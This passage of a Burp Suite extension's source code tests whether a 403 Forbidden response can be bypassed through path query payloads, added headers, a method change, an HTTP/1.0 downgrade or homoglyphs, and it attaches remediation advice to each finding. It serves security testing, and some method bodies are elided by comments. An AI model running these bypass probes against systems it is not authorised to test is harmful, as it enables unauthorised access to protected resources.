                                              repr(last_alpha_char) + u"</td><td>" + repr(homoglyph) + u"</td><td>" +
                                              unicode(str(last_alpha_index)) + u"</td><td>" + unicode(str(newRequestStatusCode)) + u"</td><td>" +
                                              unicode(resultContentLength) + u"</td></tr>")
                                    return [detail, newRequestResult]
                        except Exception as e:
                            print("      (!) Error processing homoglyph " + repr(homoglyph) + " for last char: " + str(e))
                else:
                    print("    No homoglyphs found for character '" + last_alpha_char + "'")
        except Exception as outer_e:
            print("    (!) Error during homoglyph bypass checks: " + str(outer_e))
        print("  [Homoglyph] Finished checks - no bypass found.")
        return None


    # --- Active Scan Entry Points ---
    def doPassiveScan(self, baseRequestResponse):
        # ... (doPassiveScan remains the same) ...
        return None

    def doActiveScan(self, baseRequestResponse, insertionPoint, isCalledFromMenu=False):
        # ... (doActiveScan code remains the same) ...
        baseResponseBytes = baseRequestResponse.getResponse()
        if not isCalledFromMenu and not self.isInteresting(baseResponseBytes):
            return None
        print("\n--- Starting 403 Bypass Scan ---")
        try:
            targetUrl = str(self.helpers.analyzeRequest(baseRequestResponse).getUrl())
        except:
            targetUrl = "[Could not analyze request URL]"
        print("Target: " + targetUrl)
        if self.isInteresting(baseResponseBytes):
            print("Original response status: 403 Forbidden (Scan proceeds)")
        else:
            print("Original response status: Not 403 (Scan proceeds as called from menu)")
        issueResultList = self.testRequest(baseRequestResponse) # Call testRequest
        if issueResultList:
            print("Scan complete: Bypass FOUND!")
            if isCalledFromMenu and isinstance(issueResultList, list) and len(issueResultList) > 0:
                 self.callbacks.addScanIssue(issueResultList[0])
                 return None
            else:
                 return issueResultList # Return list for Scanner
        else:
            print("Scan complete: No bypass found.")
            return None


    # --- Main Test Orchestration ---
    def testRequest(self, baseRequestResponse):
        # ... (testRequest code remains the same, calls the modified tryBypassWithQueryPayload) ...
        httpService = baseRequestResponse.getHttpService()
        try:
            requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if requestInfo is None:
                print("(!) Failed to analyze base request. Aborting checks.")
                return None
        except Exception as analysis_err:
             print("(!) Error analyzing base request: {}. Aborting checks.".format(analysis_err))
             return None
        try:
            queryPayloadsFromUI = [line.strip() for line in self.frm.queryPayloadsTextArea.getText().splitlines() if line.strip()]
            headerPayloadsFromUI = [line.strip() for line in self.frm.headerPayloadsTextArea.getText().splitlines() if line.strip()]
            falsePositiveKeywords = [line.strip() for line in self.frm.falsePositivesTextArea.getText().splitlines() if line.strip()]
            print("Loaded {} query payloads, {} header payloads, {} false positive keywords from UI.".format(
                len(queryPayloadsFromUI), len(headerPayloadsFromUI), len(falsePositiveKeywords)))
        except Exception as e:
            print("(!) Critical Error reading payloads/keywords from UI: {}. Aborting scan.".format(e))
            return None
        print("--- Testing Query Payloads ---")
        if queryPayloadsFromUI:
            for payload in queryPayloadsFromUI:
                # ---> This call now uses the modified tryBypassWithQueryPayload (which uses modified generatePayloads) <---
                result = self.tryBypassWithQueryPayload(baseRequestResponse, payload, httpService, falsePositiveKeywords)
                if result:
                    issueDetailHtml, issueHttpMessage = result
                    finding = CustomScanIssue(
                        httpService, requestInfo.getUrl(), [baseRequestResponse, issueHttpMessage],
                        "403 Bypass Found (Query Payload)",
                        "A potential 403 Forbidden bypass was found using path manipulation with a query payload.<br><br>" +
                        "<b>Details:</b><br>"
                        "<table><tr><th>Type</th><th>Bypassed URL</th><th>Payload Used</th><th>Status</th><th>Length</th></tr>" +
                        issueDetailHtml + "</table>", "High" )
                    return [finding]
        else: print("   Skipping query payload tests (no payloads configured).")
        print("--- Testing Header Payloads ---")
        if headerPayloadsFromUI:
            for payload in headerPayloadsFromUI:
                result = self.tryBypassWithHeaderPayload(baseRequestResponse, payload, httpService, falsePositiveKeywords)
                if result:
                    issueDetailHtml, issueHttpMessage = result
                    finding = CustomScanIssue(
                        httpService, requestInfo.getUrl(), [baseRequestResponse, issueHttpMessage],
                        "403 Bypass Found (Header Payload)",
                        "A potential 403 Forbidden bypass was found by adding or modifying an HTTP header.<br><br>" +
                        "<b>Details:</b><br>"
                        "<table><tr><th>Type</th><th>Original URL</th><th>Header Used</th><th>Status</th><th>Length</th></tr>" +
                        issueDetailHtml + "</table>", "High" )
                    return [finding]
        else: print("   Skipping header payload tests (no payloads configured).")
        print("--- Testing Method Change (POST + CL:0) ---")
        if requestInfo.getMethod().upper() == "GET":
            result = self.tryBypassWithPOSTAndEmptyCL(baseRequestResponse, httpService, falsePositiveKeywords)
            if result:
                issueDetailHtml, issueHttpMessage = result
                finding = CustomScanIssue(
                    httpService, requestInfo.getUrl(), [baseRequestResponse, issueHttpMessage],
                    "403 Bypass Found (Method Change)",
                    "A potential 403 Forbidden bypass was found by changing the request method from GET to POST and adding a 'Content-Length: 0' header.<br><br>" +
                    "<b>Details:</b><br>" +
                    "<table><tr><th>Type</th><th>URL</th><th>Technique Used</th><th>Status</th><th>Length</th></tr>" +
                    issueDetailHtml + "</table>", "Medium" )
                return [finding]
        else: print("   Skipping method change test (original method not GET).")
        print("--- Testing HTTP Downgrade ---")
        result = self.tryBypassWithDowngradedHttpAndNoHeaders(baseRequestResponse, httpService, falsePositiveKeywords)
        if result:
            issueDetailHtml, issueHttpMessage = result
            finding = CustomScanIssue(
                httpService, requestInfo.getUrl(), [baseRequestResponse, issueHttpMessage],
                "403 Bypass Found (HTTP Downgrade)",
                "A potential 403 Forbidden bypass was found by downgrading the request to HTTP/1.0 and removing most headers.<br><br>" +
                "<b>Details:</b><br>" +
                "<table><tr><th>Type</th><th>URL</th><th>Technique Used</th><th>Status</th><th>Length</th></tr>" +
                issueDetailHtml + "</table>", "Medium" )
            return [finding]
        print("--- Testing Homoglyph Payloads ---")
        result = self.tryBypassWithHomoglyph(baseRequestResponse, httpService, falsePositiveKeywords)
        if result:
            issueDetailHtml, issueHttpMessage = result
            finding = CustomScanIssue(
                httpService, requestInfo.getUrl(), [baseRequestResponse, issueHttpMessage],
                "403 Bypass Found (Homoglyph)",
                "A potential 403 Forbidden bypass was found using a homoglyph character in the path.<br><br>" +
                "<b>Details:</b><br>" +
                "<table><tr><th>Type</th><th>Bypassed Path</th><th>Original Char</th><th>Homoglyph</th><th>Index</th><th>Status</th><th>Length</th></tr>" +
                issueDetailHtml + "</table>",
                "Medium" # Severity set to Medium
            )
            return [finding]
        print("--- All checks finished, no bypass found ---")
        return None # Return None if no issues found

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        # ... (consolidateDuplicateIssues remains the same) ...
        if (existingIssue.getIssueName() == newIssue.getIssueName() and
            existingIssue.getUrl().toString() == newIssue.getUrl().toString()):
            return -1
        else:
            return 0

# --- Custom Scan Issue Class ---
class CustomScanIssue (IScanIssue):
    # ... (CustomScanIssue code remains the same) ...
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = ArrayList()
        if isinstance(httpMessages, list):
            for msg in httpMessages: self._httpMessages.add(msg)
        elif httpMessages is not None: self._httpMessages.add(httpMessages)
        self._name = name
        self._detail = detail
        self._severity = severity
        self._confidence = "Firm"
    def getUrl(self): return self._url
    def getIssueName(self): return self._name
    def getIssueType(self): return 0
    def getSeverity(self): return self._severity
    def getConfidence(self): return self._confidence
    def getIssueBackground(self):
        return ("The application returned a 403 Forbidden status code for the original request, "
                "indicating access was denied. However, by modifying the request in specific ways "
                "(e.g., manipulating the path with query payloads or homoglyphs, adding/altering headers, changing the HTTP method, "
                "or downgrading the protocol version), the '" + extentionName + "' extension "
                "was able to elicit a successful (2xx) response that did not appear to be a "
                "standard rejection page (based on configured false-positive keywords).<br><br>"
                "This suggests a potential misconfiguration or vulnerability in the server's "
                "access control mechanism, allowing unauthorized access to the requested resource "
                "under certain conditions.")
    def getRemediationBackground(self):
        return ("Access control decisions should be enforced consistently and securely, typically "
                "at the application layer, based on the authenticated user's verified privileges "
                "and the canonical representation of the resource being accessed.<br><br>"
                "**Key Principles:**<br>"
                "<ul><li><b>Centralized Enforcement:</b> Implement access control checks within the application logic, after authentication and URL/input normalization.</li>"
                "<li><b>Deny by Default:</b> Access should only be granted explicitly based on permissions.</li>"
                "<li><b>Least Privilege:</b> Users should only have access to the resources necessary for their role.</li>"
                "<li><b>Validate Inputs:</b> Do not trust client-controlled data, including paths (perform proper unicode normalization and canonicalization before checks), headers, or method overrides, for security decisions without proper validation.</li>"
                "<li><b>Consistent Checks:</b> Ensure checks are applied uniformly, regardless of minor variations in the request path, headers, or method.</li>"
                "<li><b>Unicode Normalization:</b> Normalize Unicode input (e.g., to NFKC form) before performing security checks on paths or other string inputs to handle homoglyphs and other visually similar characters consistently.</li>"
                "<li><b>Server Configuration Review:</b> Examine web server rules, load balancer configurations, and framework security settings for potential bypass vectors.</li></ul>")
    def getIssueDetail(self): return self._detail
    def getRemediationDetail(self):
        return ("1. Analyze the specific bypass technique reported in the issue details (e.g., path payload, header used, homoglyph character).\n"
                "2. Identify the component responsible for the inconsistent access control (e.g., web server module, application filter, routing logic).\n"
                "3. Correct the logic to ensure access is denied consistently for the target resource, regardless of the bypass technique used.\n"
                "4. Implement robust URL and input normalization (including Unicode normalization like NFKC) *before* performing access checks.\n"
                "5. Avoid relying on modifiable request elements for critical security decisions.\n"
                "6. Consider adding monitoring or WAF rules to detect and potentially block attempts to use these bypass techniques.")
    def getHttpMessages(self): return self._httpMessages
    def getHttpService(self): return self._httpService

# --- UI Class (No Change Needed) ---
class uiTab(JFrame):
    def __init__(self):
        self.panel = JPanel()
        self.queryPayloadsLabel = JLabel("Query Payloads (one per line):")
        self.headerPayloadsLabel = JLabel("Header Payloads (one per line):")
        self.falsePositivesLabel = JLabel("False Positive Keywords (one per line):")
        self.queryPayloadsTextArea = JTextArea()
        self.headerPayloadsTextArea = JTextArea()
        self.falsePositivesTextArea = JTextArea()
        self.queryScrollPane = JScrollPane(self.queryPayloadsTextArea)
        self.headerScrollPane = JScrollPane(self.headerPayloadsTextArea)
        self.falsePositivesScrollPane = JScrollPane(self.falsePositivesTextArea)
        self.queryPayloadsTextArea.setText("\n".join(defaultQueryPayloads))
        self.headerPayloadsTextArea.setText("\n".join(defaultHeaderPayloads))
        self.falsePositivesTextArea.setText("\n".join(defaultFalsePositives))
        layout = GroupLayout(self.panel)
        self.panel.setLayout(layout)
        layout.setAutoCreateGaps(True)
        layout.setAutoCreateContainerGaps(True)
        pref_width = 250
        pref_height = 300
        layout.setHorizontalGroup(
            layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                    .addComponent(self.queryPayloadsLabel)
                    .addComponent(self.queryScrollPane, GroupLayout.PREFERRED_SIZE, pref_width, GroupLayout.PREFERRED_SIZE)
                )
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                    .addComponent(self.headerPayloadsLabel)
                    .addComponent(self.headerScrollPane, GroupLayout.PREFERRED_SIZE, pref_width, GroupLayout.PREFERRED_SIZE)
                )
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                    .addComponent(self.falsePositivesLabel)
                    .addComponent(self.falsePositivesScrollPane, GroupLayout.PREFERRED_SIZE, pref_width, GroupLayout.PREFERRED_SIZE)
                )
        )
        layout.setVerticalGroup(
            layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                .addGroup(layout.createSequentialGroup()
                    .addComponent(self.queryPayloadsLabel)
                    .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(self.queryScrollPane, GroupLayout.DEFAULT_SIZE, pref_height, Short.MAX_VALUE)
                )
                .addGroup(layout.createSequentialGroup()
                    .addComponent(self.headerPayloadsLabel)
                    .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(self.headerScrollPane, GroupLayout.DEFAULT_SIZE, pref_height, Short.MAX_VALUE)
                )
                .addGroup(layout.createSequentialGroup()
                    .addComponent(self.falsePositivesLabel)
                    .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(self.falsePositivesScrollPane, GroupLayout.DEFAULT_SIZE, pref_height, Short.MAX_VALUE)
                )
        )